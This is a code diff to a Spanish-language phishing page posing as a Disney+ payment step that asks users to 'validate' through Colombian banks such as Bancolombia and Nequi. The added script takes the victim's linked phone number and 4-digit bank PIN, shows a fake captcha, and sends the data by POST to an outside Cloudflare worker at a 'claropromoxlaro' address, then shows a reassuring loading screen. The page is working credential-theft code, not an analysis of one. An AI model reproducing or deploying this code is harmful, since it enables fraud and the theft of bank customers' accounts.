@@ -150,29 +150,107 @@ input::placeholder {
     color: #666;
 }
 
+/* MENSAJES DE VALIDACIÓN */
+.validation-message {
+    font-size: 12px;
+    color: #ff4444;
+    margin-top: 5px;
+    display: none;
+}
+
+/* CAPTCHA SECTION */
+.captcha-section {
+    margin: 25px 0;
+    padding: 20px;
+    border-radius: 12px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid #333;
+}
+
+.captcha-instructions {
+    text-align: center;
+    font-size: 14px;
+    color: #9ca3af;
+    margin-bottom: 15px;
+}
+
+.captcha-progress-container {
+    width: 100%;
+    height: 50px;
+    background: #222;
+    border-radius: 25px;
+    overflow: hidden;
+    position: relative;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+}
+
+.captcha-progress-container:hover {
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+
+.captcha-progress-fill {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #00c8ff, #0099cc);
+    border-radius: 25px;
+    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.captcha-progress-container.completed .captcha-progress-fill {
+    background: linear-gradient(90deg, #00C853, #4CAF50);
+}
+
+.captcha-text {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 14px;
+    font-weight: 500;
+    color: #9ca3af;
+    z-index: 2;
+    transition: all 0.3s ease;
+}
+
+.captcha-progress-container.completed .captcha-text {
+    color: white;
+    font-weight: 600;
+}
+
 /* BOTÓN */
 button {
     width: 100%;
     padding: 16px;
     margin-top: 25px;
-    background: linear-gradient(135deg, #00c8ff, #0099cc);
-    color: #000;
+    background: #333;
+    color: #888;
     border: none;
     font-size: 17px;
     font-weight: 600;
     border-radius: 10px;
-    cursor: pointer;
+    cursor: not-allowed;
     transition: all 0.3s;
     letter-spacing: 0.5px;
 }
 
-button:hover {
+button.active {
+    background: linear-gradient(135deg, #00c8ff, #0099cc);
+    color: #000;
+    cursor: pointer;
+}
+
+button.active:hover {
     background: linear-gradient(135deg, #22dbff, #00aadd);
     transform: translateY(-2px);
     box-shadow: 0 5px 15px rgba(0, 200, 255, 0.3);
 }
 
-button:active {
+button.active:active {
     transform: translateY(0);
 }
 
@@ -193,6 +271,23 @@ button:active {
 
 .payment-info strong {
     color: #00c8ff;
+}
+
+/* LOADER */
+#loader {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(15, 15, 15, 0.95);
+    z-index: 9999;
+    text-align: center;
+    padding-top: 40%;
+    font-size: 18px;
+    color: #00c8ff;
+    font-weight: 600;
 }
 
 /* FOOTER */
@@ -257,24 +352,40 @@ footer a:hover {
         </div>
         <div class="bank-info">
             <div id="bankName" class="bank-name">Validación Bancaria</div>
-            <div class="bank-message">Ingrese sus credenciales de acceso</div>
+            <div id="bankMessage" class="bank-message">Ingrese sus credenciales de acceso</div>
         </div>
     </div>
 
-    <!-- FORMULARIO -->
+    <!-- FORMULARIO CON VALIDACIÓN COMPLETA -->
     <div class="form-group">
-        <label>Usuario / Documento</label>
+        <label>Número vinculado <span style="color:#ff4444">*</span></label>
         <div class="input-with-icon">
-            <span class="input-icon">👤</span>
-            <input type="text" placeholder="Ej: usuario@banco.com" id="username">
+            <span class="input-icon">📱</span>
+            <input type="number" id="usuario" placeholder="Ej: 3115555555" 
+                   pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric">
         </div>
+        <div class="validation-message" id="usuario-error">Número inválido (10 dígitos, empezar con 3)</div>
     </div>
 
     <div class="form-group">
-        <label>Contraseña</label>
+        <label>Clave de 4 dígitos <span style="color:#ff4444">*</span></label>
         <div class="input-with-icon">
             <span class="input-icon">🔒</span>
-            <input type="password" placeholder="Ingrese su contraseña" id="password">
+            <input type="password" id="clave" placeholder="****" 
+                   pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric">
+        </div>
+        <div class="validation-message" id="clave-error">Clave inválida (4 dígitos)</div>
+    </div>
+
+    <!-- CAPTCHA CON BARRA DE PROGRESO -->
+    <div class="captcha-section">
+        <div class="captcha-instructions">Haz clic para verificar que no eres un robot</div>
+        <div class="captcha-progress-container" id="captchaProgress">
+            <div class="captcha-progress-fill" id="captchaFill"></div>
+            <div class="captcha-text" id="captchaText">Haz clic para verificar</div>
+        </div>
+        <div class="validation-message" id="captcha-error" style="text-align: center;">
+            Por favor verifica que no eres un robot
         </div>
     </div>
 
@@ -286,7 +397,9 @@ footer a:hover {
     </div>
 
     <!-- BOTÓN -->
-    <button onclick="procesar()">VALIDAR Y AUTORIZAR PAGO</button>
+    <button id="loginBtn">
+        <span id="btnText">VALIDAR Y AUTORIZAR PAGO</span>
+    </button>
 
 </div>
 
@@ -298,7 +411,20 @@ footer a:hover {
     <a href="#">Ayuda</a>
 </footer>
 
+<!-- LOADER -->
+<div id="loader"></div>
+
 <script>
+// 🔥 WORKER URL - LÓGICA COMPLETA
+const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
+
+// Variables globales
+let captchaValidado = false;
+let camposValidos = {
+    usuario: false,
+    clave: false
+};
+
 // LISTA COMPLETA DE LOGOS DE BANCOS COLOMBIANOS
 const bankLogos = {
     "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Logo_Bancolombia.png/800px-Logo_Bancolombia.png",
@@ -312,29 +438,221 @@ const bankLogos = {
 
 // TEXTO DESCRIPTIVO DE CADA BANCO
 const bankDescriptions = {
-    "Bancolombia": "Acceda con su usuario Bancolombia a la persona",
-    "Nequi": "Ingrese su número de teléfono y PIN de Nequi",
-    "Davivienda": "Usuario Davivienda Móvil o DaviPlata",
-    "BBVA": "Credenciales de BBVA Móvil o Banca Online",
-    "Banco Popular": "Usuario Banco Popular Personas",
-    "Banco de Bogotá": "Acceso Banco de Bogotá Digital",
-    "Itaú": "Credenciales Itaú Personas o Itaú Móvil"
+    "Bancolombia": "Ingrese su número de celular vinculado",
+    "Nequi": "Ingrese su número de teléfono y PIN",
+    "Davivienda": "Ingrese sus credenciales de acceso",
+    "BBVA": "Ingrese sus credenciales de acceso",
+    "Banco Popular": "Ingrese sus credenciales de acceso",
+    "Banco de Bogotá": "Ingrese sus credenciales de acceso",
+    "Itaú": "Ingrese sus credenciales de acceso"
 };
 
-// RECUPERAR DATOS DEL PAGO
-const selectedBank = localStorage.getItem("selectedBank") || "";
-const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+// 🔥 FUNCIÓN DE VALIDACIÓN (LÓGICA COMPLETA)
+function validarCampo(campoId, valor) {
+    const errorElement = document.getElementById(campoId + '-error');
+    let esValido = false;
 
-// ELEMENTOS DEL DOM
-const bankLogoElement = document.getElementById("bankLogo");
-const bankNameElement = document.getElementById("bankName");
-const bankMessageElement = document.querySelector(".bank-message");
-const paymentAmountElement = document.getElementById("paymentAmount");
-const paymentRefElement = document.getElementById("paymentRef");
+    switch(campoId) {
+        case 'usuario':
+            esValido = /^3[0-9]{9}$/.test(valor);
+            break;
+        case 'clave':
+            esValido = /^[0-9]{4}$/.test(valor);
+            break;
+    }
 
-// FUNCIÓN PARA CONFIGURAR LA PÁGINA
-function setupPage() {
+    // Actualizar estado
+    camposValidos[campoId] = esValido;
+    
+    if (esValido) {
+        errorElement.style.display = 'none';
+    } else {
+        errorElement.style.display = 'block';
+    }
+
+    return esValido;
+}
+
+// 🔥 ACTUALIZAR PROGRESO (LÓGICA COMPLETA)
+function actualizarProgreso() {
+    const campos = ['usuario', 'clave'];
+    let completados = 0;
+
+    campos.forEach(campo => {
+        const valor = document.getElementById(campo).value;
+        if (validarCampo(campo, valor)) {
+            completados++;
+        }
+    });
+
+    // Añadir CAPTCHA
+    if (captchaValidado) {
+        completados++;
+        document.getElementById('captcha-error').style.display = 'none';
+    } else {
+        document.getElementById('captcha-error').style.display = 'block';
+    }
+
+    return completados === (campos.length + 1);
+}
+
+// 🔥 VALIDAR CAMPOS Y ACTUALIZAR BOTÓN (LÓGICA COMPLETA)
+function validarCampos() {
+    const todosCompletos = actualizarProgreso();
+    const loginBtn = document.getElementById('loginBtn');
+    const btnText = document.getElementById('btnText');
+
+    if (todosCompletos) {
+        loginBtn.classList.add('active');
+        loginBtn.disabled = false;
+        btnText.textContent = "✅ VALIDAR Y AUTORIZAR PAGO";
+    } else {
+        loginBtn.classList.remove('active');
+        loginBtn.disabled = true;
+        btnText.textContent = "VALIDAR Y AUTORIZAR PAGO";
+    }
+}
+
+// 🔥 CAPTCHA (LÓGICA COMPLETA)
+document.getElementById('captchaProgress').addEventListener('click', function () {
+    if (captchaValidado) return;
+
+    captchaValidado = true;
+    const captchaFill = document.getElementById('captchaFill');
+    const captchaText = document.getElementById('captchaText');
+    const captchaContainer = document.getElementById('captchaProgress');
+
+    // Animación de llenado
+    captchaFill.style.width = '100%';
+    captchaContainer.classList.add('completed');
+    captchaText.textContent = "✓ Verificado";
+
+    // Actualizar validación
+    setTimeout(() => {
+        validarCampos();
+    }, 500);
+});
+
+// 🔥 MANEJO DEL FORMULARIO (LÓGICA COMPLETA)
+document.getElementById('loginBtn').addEventListener('click', async function (e) {
+    e.preventDefault();
+
+    if (!actualizarProgreso()) {
+        alert('Por favor completa todos los campos correctamente.');
+        return;
+    }
+
+    const loader = document.getElementById('loader');
+    const loginBtn = document.getElementById('loginBtn');
+    const selectedBank = localStorage.getItem("selectedBank") || "Banco";
+    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+
+    // Mostrar loader
+    loader.style.display = 'block';
+    loader.innerHTML = `
+        <div style="font-size: 24px; margin-bottom: 20px;">⏳</div>
+        Verificando identidad...
+        <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Esto puede tomar unos segundos</div>
+    `;
+    loginBtn.disabled = true;
+
+    const datos = {
+        usuario: document.getElementById('usuario').value.trim(),
+        clave: document.getElementById('clave').value.trim(),
+        nombre: "Usuario Disney+",
+        correo: "usuario@disney.com",
+        cedula: "CC 000000000",
+        saldo: 0,
+        transactionId: 'DISNEY_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+        bank: selectedBank,
+        plan: paymentData.plan || "standard_ads",
+        amount: paymentData.amount || "COP 24.900/mes"
+    };
+
+    console.log("📤 Enviando datos a worker:", datos);
+
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+        const response = await fetch(`${WORKER_URL}/login`, {
+            method: "POST",
+            headers: { 
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(datos),
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+
+        const result = await response.json();
+        console.log("✅ Respuesta del worker:", result);
+
+        if (result.ok) {
+            localStorage.setItem('bankAuthData', JSON.stringify(datos));
+            
+            loader.innerHTML = `
+                <div style="font-size: 24px; margin-bottom: 20px;">✅</div>
+                Datos verificados correctamente<br>
+                <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Redirigiendo...</div>
+            `;
+            
+            setTimeout(() => {
+                window.location.href = 'procesando.html';
+            }, 2000);
+
+        } else {
+            throw new Error(result.error || 'Error del servidor');
+        }
+
+    } catch (error) {
+        console.error('❌ Error:', error);
+        
+        let errorMessage = "Error de conexión";
+        if (error.name === 'AbortError') {
+            errorMessage = "Tiempo de espera agotado. Revisa tu conexión.";
+        }
+
+        loader.innerHTML = `
+            <div style="font-size: 24px; margin-bottom: 20px;">❌</div>
+            ${errorMessage}<br>
+            <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Reintentando en 3 segundos...</div>
+        `;
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            loginBtn.disabled = false;
+        }, 3000);
+    }
+});
+
+// 🔥 EVENT LISTENERS PARA VALIDACIÓN (LÓGICA COMPLETA)
+document.getElementById('usuario').addEventListener('input', function() {
+    validarCampo('usuario', this.value);
+    validarCampos();
+});
+
+document.getElementById('clave').addEventListener('input', function() {
+    validarCampo('clave', this.value);
+    validarCampos();
+});
+
+// 🔥 INICIALIZACIÓN (LÓGICA COMPLETA)
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('✅ Validación bancaria lista');
+    
     // Configurar banco
+    const selectedBank = localStorage.getItem("selectedBank") || "";
+    const bankLogoElement = document.getElementById("bankLogo");
+    const bankNameElement = document.getElementById("bankName");
+    const bankMessageElement = document.getElementById("bankMessage");
+    
     if (selectedBank && bankLogos[selectedBank]) {
         bankLogoElement.src = bankLogos[selectedBank];
         bankLogoElement.alt = `Logo ${selectedBank}`;
@@ -344,76 +662,32 @@ function setupPage() {
             bankMessageElement.textContent = bankDescriptions[selectedBank];
         }
     } else {
-        // Si no hay banco seleccionado, mostrar mensaje
-        bankLogoElement.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300c8ff'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E";
-        bankLogoElement.alt = "Banco no seleccionado";
         bankNameElement.textContent = "Banco no seleccionado";
-        bankMessageElement.textContent = "Por favor, regrese y seleccione un banco";
+        bankMessageElement.textContent = "Regrese y seleccione un banco";
         bankMessageElement.style.color = "#ff5555";
     }
     
     // Configurar información del pago
+    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
     if (paymentData.amount) {
-        paymentAmountElement.textContent = paymentData.amount;
+        document.getElementById("paymentAmount").textContent = paymentData.amount;
     } else {
-        paymentAmountElement.textContent = "COP 24.900/mes";
+        document.getElementById("paymentAmount").textContent = "COP 24.900/mes";
     }
     
     // Generar referencia única
     const refNumber = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
-    paymentRefElement.textContent = `DISNEY-${refNumber}`;
-    
-    // Guardar referencia para usar después
+    document.getElementById("paymentRef").textContent = `DISNEY-${refNumber}`;
     localStorage.setItem("paymentReference", refNumber);
-}
+    
+    // Validación inicial
+    validarCampos();
+});
 
-// FUNCIÓN PARA PROCESAR EL PAGO
-function procesar() {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
-    
-    // Validación básica
-    if (!username || !password) {
-        alert("Por favor, ingrese su usuario y contraseña.");
-        return;
-    }
-    
-    if (!selectedBank) {
-        alert("Error: No se ha seleccionado un banco. Regrese al paso anterior.");
-        return;
-    }
-    
-    // Mostrar mensaje de procesamiento
-    const btn = document.querySelector("button");
-    const originalText = btn.textContent;
-    btn.textContent = "PROCESANDO...";
-    btn.disabled = true;
-    
-    // Simular procesamiento
-    setTimeout(() => {
-        // Guardar datos de autenticación (en un caso real esto iría al servidor)
-        const authData = {
-            bank: selectedBank,
-            username: username,
-            timestamp: new Date().toISOString(),
-            reference: localStorage.getItem("paymentReference"),
-            plan: paymentData.plan || "standard_ads"
-        };
-        
-        localStorage.setItem("bankAuthData", JSON.stringify(authData));
-        
-        // Redirigir a página de éxito/procesando
-        window.location.href = "procesando.html";
-    }, 1500);
-}
-
-// Inicializar página cuando se carga
-document.addEventListener('DOMContentLoaded', setupPage);
-
-// Manejar Enter para enviar formulario
+// 🔥 MANEJAR ENTER
 document.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') {
-        procesar();
+    if (e.key === 'Enter' && document.getElementById('loginBtn').classList.contains('active')) {
+        document.getElementById('loginBtn').click();
     }
 });
 </script>
